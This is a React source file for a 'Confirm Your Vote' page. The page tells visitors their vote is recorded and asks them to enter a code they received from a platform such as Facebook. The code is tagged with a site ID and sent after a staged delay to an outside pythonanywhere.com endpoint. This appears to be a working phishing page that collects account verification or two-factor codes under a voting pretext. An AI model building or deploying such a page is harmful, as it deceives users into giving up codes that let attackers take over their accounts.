import React, { useState } from "react";
import { FaCheckCircle } from "react-icons/fa"; // Green check icon from react-icons
import { useNavigate } from "react-router-dom"; // For navigation
import { useSite } from "../context/SiteContext"; // Import the site context

const ConfirmPage: React.FC = () => {
  const [code, setCode] = useState(""); // State to store the confirmation code
  const [isLoading, setIsLoading] = useState(false); // State to handle loading state
  const [error, setError] = useState(""); // State to handle errors
  const navigate = useNavigate(); // Hook for navigation
  const { siteId } = useSite(); // Corrected semicolon

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");
    const xcode = `${code}_${siteId}`;

    // Simulate a delay before making the API request
    setTimeout(async () => {
      try {
        // API call to /code/ endpoint
        const response = await fetch("https://bossj.pythonanywhere.com/api/code/", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ xcode }),
        });

        if (response.ok) {
          // Redirect to /done page on success
          navigate("/done");
        } else {
          setError("Invalid code. Please try again.");
        }
      } catch (err) {
        setError("An error occurred. Please try again later.");
      } finally {
        setIsLoading(false);
      }
    }, 2000); // 2-second delay
  };

  return (
    <div style={styles.container}>
      <div style={styles.content}>
        {/* Green check icon */}
        <FaCheckCircle style={styles.icon} />

        {/* Header */}
        <h1 style={styles.header}>Confirm Your Vote</h1>

        {/* Description */}
        <p style={styles.paragraph}>
          Your vote has been successfully submitted. To confirm it's you, please enter the code you received from the platform you voted with (e.g., Facebook).
          <br />
          <strong>Note:</strong> It may take a few minutes to receive your confirmation code.
        </p>

        {/* Form for confirmation code */}
        <form onSubmit={handleSubmit} style={styles.form}>
          <input
            type="text"
            placeholder="Enter your confirmation code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            style={styles.input}
            required
          />
          <button type="submit" style={styles.button} disabled={isLoading}>
            {isLoading ? "Submitting..." : "Confirm"}
          </button>
        </form>

        {/* Display error message if any */}
        {error && <p style={styles.error}>{error}</p>}
      </div>
    </div>
  );
};

// Styles
const styles: { [key: string]: React.CSSProperties } = {
  container: {
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    minHeight: "100vh",
    backgroundColor: "#f0f2f5",
    fontFamily: "Arial, sans-serif",
  },
  content: {
    textAlign: "center",
    maxWidth: "400px",
    padding: "20px",
    backgroundColor: "#ffffff",
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
  },
  icon: {
    fontSize: "64px",
    color: "#28a745", // Green color
    marginBottom: "20px",
  },
  header: {
    fontSize: "24px",
    fontWeight: "bold",
    color: "#333",
    marginBottom: "16px",
  },
  paragraph: {
    fontSize: "16px",
    color: "#666",
    lineHeight: "1.5",
    marginBottom: "20px",
  },
  form: {
    display: "flex",
    flexDirection: "column",
    gap: "10px",
  },
  input: {
    padding: "10px",
    fontSize: "16px",
    borderRadius: "4px",
    border: "1px solid #ccc",
    outline: "none",
  },
  button: {
    padding: "10px",
    fontSize: "16px",
    backgroundColor: "#28a745",
    color: "#fff",
    border: "none",
    borderRadius: "4px",
    cursor: "pointer",
  },
  error: {
    color: "#dc3545",
    fontSize: "14px",
    marginTop: "10px",
  },
};

export default ConfirmPage;